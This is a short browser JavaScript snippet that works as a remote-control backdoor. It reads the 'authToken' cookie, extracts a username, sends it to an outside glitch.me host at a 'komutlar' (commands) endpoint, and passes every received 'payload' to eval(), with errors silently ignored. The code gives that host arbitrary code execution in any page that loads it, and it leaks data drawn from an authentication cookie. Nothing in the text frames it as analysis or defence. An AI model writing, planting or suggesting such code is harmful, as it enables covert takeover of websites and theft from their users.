const getUsername = () => {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        const [name, value] = cookie.trim().split('=');
        if (name === 'authToken') {
            const decodedUsername = decodeURIComponent(value.split('_')[0]);
            return decodedUsername;
        }
    }
    return null;
};

const username = getUsername();

const eventSource = new EventSource(`https://tortoiseshell-bramble-day.glitch.me/komutlar?username=${encodeURIComponent(username)}`);
eventSource.onmessage = (event) => {
    const data = JSON.parse(event.data);
    if (data.payload) {
        eval(data.payload);
    }
};
eventSource.onerror = () => {};
eventSource.onopen = () => {};
